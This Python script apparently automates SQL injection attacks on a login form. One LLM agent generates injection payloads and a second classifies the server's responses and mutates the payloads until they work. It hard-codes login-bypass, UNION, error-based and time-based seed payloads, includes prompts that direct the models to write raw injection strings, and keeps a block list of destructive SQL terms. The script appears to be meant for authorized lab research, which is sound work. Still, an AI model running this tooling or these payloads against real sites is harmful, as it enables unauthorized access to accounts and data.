import argparse
import csv
import json
import os
import re
import sys
import time
import uuid
import random
import signal
import hashlib
import itertools
from datetime import datetime
from enum import Enum
from typing import List, Dict, Any, Optional, Tuple

# Third-party
from autogen import AssistantAgent  # pip install pyautogen

# Local modules (same directory)
from utils.llm_config import vicuna, mistral_lowtemp
from utils.cleaner import clean_payload
from utils.test_payload import test_payload

# -------- Constants / Guards --------
DEFAULT_PASSWORD = "password"
DEFAULT_TIMEOUT = 30
DEFAULT_RATE_LIMIT_SEC = 1.0
MAX_BODY_SNAPSHOT = 2000  # chars

BLOCKED_TERMS = {
    "drop ", "alter ", "truncate ", "delete ",
    "xp_", "exec ", "sp_", "outfile", "dumpfile"
}

# -------- Utility helpers --------
def now_iso() -> str:
    return datetime.utcnow().replace(microsecond=0).isoformat() + "Z"

def sha1(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8")).hexdigest()

def ensure_dir(path: str):
    d = os.path.dirname(path)
    if d:
        os.makedirs(d, exist_ok=True)

def save_json(path: str, obj: Any):
    ensure_dir(path)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2)

def append_jsonl(path: str, obj: Any):
    ensure_dir(path)
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(obj) + "\n")

def graceful_sigint():
    stop = {"flag": False}
    def handler(sig, frame):
        stop["flag"] = True
        print("\n[!] SIGINT received; finishing current payload then stopping.")
    signal.signal(signal.SIGINT, handler)
    return stop

# -------- SQLi method selection --------
class SQLIMethod(str, Enum):
    AUTO = "auto"
    LOGIN_BYPASS = "login_bypass"
    UNION_BASED  = "union_based"
    ERROR_BASED  = "error_based"
    TIME_BASED   = "time_based"

def get_method_seeds(method: SQLIMethod) -> List[str]:
    """
    Minimal defensive-test seeds per technique.
    Kept compact and scoped for login form fuzzing.
    """
    if method == SQLIMethod.LOGIN_BYPASS:
        return [
            "' OR 1=1 --",
            "' OR 'a'='a' --",
            "') OR '1'='1' -- ",
        ]
    if method == SQLIMethod.UNION_BASED:
        return [
            "' OR 1=1 -- UNION SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 0,1 --",
        ]
    if method == SQLIMethod.ERROR_BASED:
        return [
            "' AND (SELECT 1/0) --",
            "' AND CAST('x' AS SIGNED) --",
            "' OR (SELECT CONVERT('text', JSON_EXTRACT('[1]', '$[2]'))) --",
        ]
    if method == SQLIMethod.TIME_BASED:
        # MySQL/MariaDB style; short delays to avoid hanging loops
        return [
            "' OR IF(1=1,SLEEP(3),0) -- ",
            "' OR SLEEP(3) -- ",
            "') OR IF(1=1,SLEEP(2),0) -- ",
        ]
    return ["' OR 1=1 --"]

def method_prompt_hint(method: SQLIMethod) -> str:
    if method == SQLIMethod.AUTO:
        return ""
    mapping = {
        SQLIMethod.LOGIN_BYPASS: "- Restrict outputs to login-bypass tautology payloads (no UNION/time/error patterns).\n",
        SQLIMethod.UNION_BASED:  "- Restrict outputs to UNION-based payloads; keep column counts small; avoid DDL/DML.\n",
        SQLIMethod.ERROR_BASED:  "- Restrict outputs to error-based payloads that elicit benign conversion/arith errors.\n",
        SQLIMethod.TIME_BASED:   "- Restrict outputs to time-based payloads (SLEEP/WAITFOR/benchmark) with delays ≤ 3s.\n",
    }
    return mapping[method]

# -------- Seeds / Validation --------
def load_seed_payloads(path: Optional[str]) -> List[str]:
    """
    Load seeds from CSV column 'payload'.
    """
    if not path or not os.path.exists(path):
        return ["' OR 1=1 --"]
    payloads = []
    try:
        with open(path, newline="", encoding="utf-8", errors="ignore") as f:
            reader = csv.DictReader(f)
            for row in reader:
                p = (row.get("payload") or "").strip()
                if p:
                    payloads.append(p)
    except Exception:
        return ["' OR 1=1 --"]
    # unique keep-order, cap at 50
    uniq, seen = [], set()
    for p in payloads:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq[:50] or ["' OR 1=1 --"]

def bootstrap_improved_bank_from_csv(csv_path: Optional[str], limit: int) -> List[str]:
    """
    Prefill improved bank from prior CSV: prefer 'improved_payload', fallback 'payload'.
    """
    bank = []
    if not csv_path or not os.path.exists(csv_path):
        return bank
    try:
        with open(csv_path, newline='', encoding='utf-8', errors='ignore') as f:
            reader = csv.DictReader(f)
            for row in reader:
                cand = (row.get('improved_payload') or row.get('payload') or '').strip()
                if not cand:
                    continue
                c = clean_payload(cand)
                if validate_payload(c):
                    bank.append(c)
    except Exception:
        return []
    # keep last 'limit' unique (recency wins)
    uniq, seen = [], set()
    for c in reversed(bank):
        if c not in seen:
            uniq.append(c); seen.add(c)
    return list(reversed(uniq[-limit:]))

def validate_payload(payload: str) -> bool:
    """
    Relaxed acceptance for legitimate SQLi variants; blocks known destructive terms.
    """
    if not isinstance(payload, str):
        return False
    payload = payload.strip()
    if not payload:
        return False
    p = payload.lower()
    if any(term in p for term in BLOCKED_TERMS):
        return False

    has_operator = any(tok in p for tok in [" or ", " and ", " union ", " like ", " in(", " sleep", "waitfor", "--", "/*", "*/"])
    looks_sqlish = has_operator or ("select" in p) or ("insert" in p) or ("update" in p) or ("delete" in p)

    if not looks_sqlish:
        return False
    if not (4 <= len(payload) <= 200):
        return False
    return True

# -------- Prompt builders --------
def build_generation_prompt(base_payloads: List[str],
                            payload_count: int,
                            conservative: bool,
                            method: SQLIMethod) -> str:
    seeds_blob = "\n".join(f"- {s}" for s in base_payloads[:max(1, payload_count)])
    guard = ""
    if conservative:
        guard = (
            "Do NOT use DROP/ALTER/TRUNCATE/DELETE. Avoid schema enumeration. "
            "Focus on login-bypass patterns (tautology, UNION with NULL padding, short time delays). "
        )
    method_guard = method_prompt_hint(method)
    guidelines = (
        "Output RAW SQL injection strings for a login form, ONE PER LINE. "
        "No numbering, no markdown, no commentary. Across the list, vary: quoting style (single/double), "
        "whitespace, comment style (-- and /* */), operator forms (OR/AND, tautology), "
        "encoding/case toggling, UNION with NULL padding, optional short time delays. "
        "Target length 12..180 chars.\n"
    )
    return (
        f"{guard}{method_guard}{guidelines}"
        f"Use these as seeds where helpful:\n{seeds_blob}\n"
        f"Return exactly {payload_count} distinct lines."
    )

def build_discriminator_prompt(payload: str,
                               http_status: int,
                               elapsed: float,
                               last_working: Optional[str],
                               extra_instruction: Optional[str] = None) -> str:
    base = (
        "Classify the SQL injection attempt using ONLY this JSON schema "
        "{\"classification\":\"...\",\"reasoning\":\"...\",\"improvement\":\"...\",\"improved_payload\":\"...\"}.\n"
        f"payload: {payload}\n"
        f"http_status: {http_status}\n"
        f"elapsed_sec: {elapsed:.3f}\n"
        f"last_working_payload: {last_working or ''}\n"
        "Rules: Output ONLY valid JSON. No markdown, no text before/after the JSON. "
        "Use a syntactically valid improved_payload suitable for a login form.\n"
    )
    if extra_instruction:
        base += f"\n{extra_instruction}\n"
    return base

def extract_json(content: str) -> Optional[Dict[str, Any]]:
    if not content:
        return None
    c = re.sub(r"```[a-zA-Z]*", "", content).replace("```", "").strip()
    m = re.search(r"\{.*\}", c, re.DOTALL)
    if not m:
        return None
    try:
        return json.loads(m.group(0))
    except json.JSONDecodeError:
        return None

# -------- Agent factories --------
def create_generator_agent() -> AssistantAgent:
    return AssistantAgent(name="GeneratorAgent", llm_config=vicuna)

def create_discriminator_agent() -> AssistantAgent:
    return AssistantAgent(name="DiscriminatorAgent", llm_config=mistral_lowtemp)

# -------- Runners --------
def run_generator(generator: AssistantAgent,
                  base_payloads: List[str],
                  payload_count: int,
                  conservative: bool,
                  method: SQLIMethod) -> List[str]:
    prompt = build_generation_prompt(base_payloads, payload_count, conservative, method)
    reply = generator.generate_reply(messages=[{"role": "user", "content": prompt}], max_tokens=768)
    lines = (reply.get("content") or "").splitlines()
    cleaned, seen = [], set()
    for line in lines:
        p = clean_payload(line)
        if not p or p in seen:
            continue
        seen.add(p)
        cleaned.append(p)
    return cleaned[:payload_count]

def run_discriminator(discriminator: AssistantAgent,
                      payload: str,
                      http_status: int,
                      elapsed: float,
                      last_working: Optional[str],
                      extra_instruction: Optional[str] = None) -> Dict[str, Any]:
    prompt = build_discriminator_prompt(payload, http_status, elapsed, last_working, extra_instruction=extra_instruction)
    reply = discriminator.generate_reply(messages=[{"role": "user", "content": prompt}], max_tokens=768)
    content = (reply.get("content") or "").strip()
    data = extract_json(content)
    if data is None:
        retry_prompt = build_discriminator_prompt(
            payload, http_status, elapsed, last_working,
            extra_instruction="Return ONLY one valid JSON object exactly matching the schema. No prose."
        )
        reply2 = discriminator.generate_reply(messages=[{"role": "user", "content": retry_prompt}], max_tokens=768)
        content2 = (reply2.get("content") or "").strip()
        data = extract_json(content2)
        if data is None:
            return {
                "classification": "ParseError",
                "reasoning": "Could not parse discriminator output as JSON after one retry.",
                "improvement": "",
                "improved_payload": ""
            }
    for k in ["classification", "reasoning", "improvement", "improved_payload"]:
        data.setdefault(k, "")
    return data

def force_improvement(discriminator: AssistantAgent,
                      payload: str,
                      http_status: int,
                      elapsed: float,
                      last_working: Optional[str]) -> Dict[str, Any]:
    msg = (
        "Return ONLY valid JSON. The 'improved_payload' MUST differ from the input. "
        "Apply at least one change: switch quoting style, add/end a SQL comment, adjust whitespace, "
        "use tautology (1=1), add UNION with NULL padding, or a short time delay (SLEEP/WAITFOR). "
        "Keep length < 180 chars."
    )
    return run_discriminator(discriminator, payload, http_status, elapsed, last_working, extra_instruction=msg)

# -------- Orchestrator --------
def run_experiment(url: str,
                   iterations: int,
                   payloads_per_iteration: int,
                   output_file: str,
                   jsonl_file: str,
                   seed_mode: str,
                   seed_csv: Optional[str],
                   rate_limit: float,
                   truncate_body: int,
                   conservative: bool,
                   random_seed: Optional[int] = None,
                   start_with: Optional[str] = None,
                   sqli_method: SQLIMethod = SQLIMethod.AUTO) -> Dict[str, Any]:

    if random_seed is not None:
        random.seed(random_seed)

    run_id = str(uuid.uuid4())
    print(f"[run_id] {run_id}")

    manifest = {
        "run_id": run_id,
        "created_at": now_iso(),
        "url": url,
        "iterations": iterations,
        "payloads_per_iteration": payloads_per_iteration,
        "seed_mode": seed_mode,
        "seed_csv": seed_csv,
        "rate_limit": rate_limit,
        "truncate_body": truncate_body,
        "conservative": bool(conservative),
        "random_seed": random_seed,
        "sqli_method": sqli_method.value,
        "version": "resilient-improved-mode+method"
    }
    save_json(output_file.replace(".csv", "_manifest.json"), manifest)

    generator = create_generator_agent()
    discriminator = create_discriminator_agent()

    seed_payloads: List[str] = []
    improved_payload_bank: List[str] = []
    last_working_payload: Optional[str] = None

    # Seed strategy
    if seed_mode == "dataset":
        seed_payloads = load_seed_payloads(seed_csv)
    elif seed_mode == "single":
        seed_payloads = [start_with or "' OR 1=1 --"]
    elif seed_mode == "improved":
        improved_payload_bank = bootstrap_improved_bank_from_csv(seed_csv, limit=2 * payloads_per_iteration)
        if improved_payload_bank:
            seed_payloads = improved_payload_bank[:payloads_per_iteration]
            print(f"[seed] bootstrapped {len(seed_payloads)} improved payloads from CSV.")
        else:
            seed_payloads = ["' OR 1=1 --"]
            print("[seed] no improved payloads found in CSV; falling back to default.")
    else:
        seed_payloads = get_method_seeds(sqli_method)

    # CSV / JSONL
    ensure_dir(output_file)
    first_write = not os.path.exists(output_file)
    csvfile = open(output_file, "a", newline="", encoding="utf-8")
    writer = csv.DictWriter(csvfile, fieldnames=[
        "run_id", "iteration", "payload", "classification", "reasoning",
        "improvement", "improved_payload", "test_status", "rt_sec", "ts",
        "parse_error", "improved_differs"
    ])
    if first_write:
        writer.writeheader()

    stop = graceful_sigint()
    prev_payloads: set = set()
    stagnation = 0

    try:
        for i in range(iterations):
            if stop["flag"]:
                break
            print(f"\n=== Iteration {i+1}/{iterations} ===")

            # Base seeds for this iteration
            if seed_mode == "improved" and improved_payload_bank:
                base_payloads = improved_payload_bank[-min(payloads_per_iteration, len(improved_payload_bank)):]
            else:
                if seed_mode == "dataset" and seed_payloads:
                    base_payloads = seed_payloads
                else:
                    base_payloads = get_method_seeds(sqli_method)

            # Generate by method
            raw_payloads = run_generator(generator, base_payloads, payloads_per_iteration, conservative, sqli_method)

            # Clean/validate/dedupe
            payloads = []
            for p in raw_payloads:
                p = clean_payload(p)
                if not p or p in prev_payloads:
                    continue
                if not validate_payload(p):
                    continue
                prev_payloads.add(p)
                payloads.append(p)

            new_improvements_count = 0

            for p in payloads:
                if stop["flag"]:
                    break

                time.sleep(rate_limit)
                start = time.time()
                resp = test_payload(
                    payload=p,
                    start_time=start,
                    url=url,
                    return_http_response=True,
                    truncate_body=truncate_body
                )
                status_code = getattr(resp, "status_code", None)
                elapsed = time.time() - start

                record = run_discriminator(discriminator, p, status_code, elapsed, last_working_payload)
                parse_error = int(record.get("classification") == "ParseError")

                ip = (record.get("improved_payload") or "").strip()
                if (not ip) or (ip == p):
                    record = force_improvement(discriminator, p, status_code, elapsed, last_working_payload)
                    ip = (record.get("improved_payload") or "").strip()

                improved_differs = 0
                if ip:
                    ip = clean_payload(ip)
                    if ip and validate_payload(ip) and ip != p:
                        improved_payload_bank.append(ip)
                        last_working_payload = ip
                        new_improvements_count += 1
                        improved_differs = 1

                row = {
                    "run_id": run_id,
                    "iteration": i + 1,
                    "payload": p,
                    "classification": record.get("classification", ""),
                    "reasoning": record.get("reasoning", ""),
                    "improvement": record.get("improvement", ""),
                    "improved_payload": ip or "",
                    "test_status": status_code,
                    "rt_sec": round(elapsed, 3),
                    "ts": now_iso(),
                    "parse_error": parse_error,
                    "improved_differs": improved_differs
                }
                writer.writerow(row)
                csvfile.flush()

                append_jsonl(jsonl_file, {
                    "run_id": run_id,
                    "iteration": i + 1,
                    "payload": p,
                    "discriminator": record,
                    "http_snapshot": {"status": status_code, "elapsed": round(elapsed, 3)},
                    "ts": row["ts"]
                })

            # Stagnation breaker
            if new_improvements_count == 0:
                stagnation += 1
            else:
                stagnation = 0

            if seed_mode == "improved" and stagnation >= 3:
                print("[stagnation] injecting fresh seeds from CSV")
                dataset_seeds = bootstrap_improved_bank_from_csv(seed_csv, limit=5 * payloads_per_iteration)
                random.shuffle(dataset_seeds)
                if dataset_seeds:
                    seed_payloads = list(itertools.islice(dataset_seeds, payloads_per_iteration))
                stagnation = 0

        print("\n Run complete.")
    finally:
        try:
            csvfile.close()
        except Exception:
            pass

    return {"run_id": run_id, "output_csv": output_file, "output_jsonl": jsonl_file}

# -------- CLI --------
def parse_args():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    ap = argparse.ArgumentParser(
        description="Multi-agent LLM SQLi Generation and Evaluation."
    )
    ap.add_argument("--url", required=True, help="Target login URL (authorized lab instance).")
    ap.add_argument("--iterations", type=int, default=25, help="Number of generator/discriminator cycles.")
    ap.add_argument("--payloads-per-iteration", type=int, default=5, help="Generator output count per cycle.")
    ap.add_argument("--output", default=f"datasets/multi_agent_output/conversation_dataset_{timestamp}.csv",
                    help="CSV output path.")
    ap.add_argument("--jsonl", default="datasets/multi_agent_output/conversation_dataset.jsonl",
                    help="JSONL output path.")
    ap.add_argument("--seed-mode", choices=["dataset", "single", "improved"], default="dataset",
                    help="Seed strategy.")
    ap.add_argument("--seed-csv", default="datasets/multi_agent_output/discriminator(2)_results_sql_payloads.csv",
                    help="CSV with 'payload' and/or 'improved_payload' columns for seeding.")
    ap.add_argument("--start-with", default=None, help="Seed payload (for seed-mode=single).")
    ap.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT_SEC,
                    help="Seconds to sleep between HTTP requests.")
    ap.add_argument("--truncate-body", type=int, default=MAX_BODY_SNAPSHOT,
                    help="Truncate response text (chars) captured by the test harness.")
    ap.add_argument("--conservative", action="store_true",
                    help="Stronger guardrails on generation prompt.")
    ap.add_argument("--seed", type=int, default=None, help="Random seed for deterministic ordering.")
    ap.add_argument("--sqli-method",
                    choices=[m.value for m in SQLIMethod],
                    default=SQLIMethod.AUTO.value,
                    help="Constrain generator to a SQL injection technique.")
    return ap.parse_args()

def main():
    args = parse_args()
    try:
        ensure_dir(args.output)
        result = run_experiment(
            url=args.url,
            iterations=args.iterations,
            payloads_per_iteration=args.payloads_per_iteration,
            output_file=args.output,
            jsonl_file=args.jsonl,
            seed_mode=args.seed_mode,
            seed_csv=args.seed_csv,
            rate_limit=args.rate_limit,
            truncate_body=max(0, args.truncate_body),
            conservative=args.conservative,
            random_seed=args.seed,
            start_with=args.start_with,
            sqli_method=SQLIMethod(args.sqli_method),
        )
        print(json.dumps(result, indent=2))
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()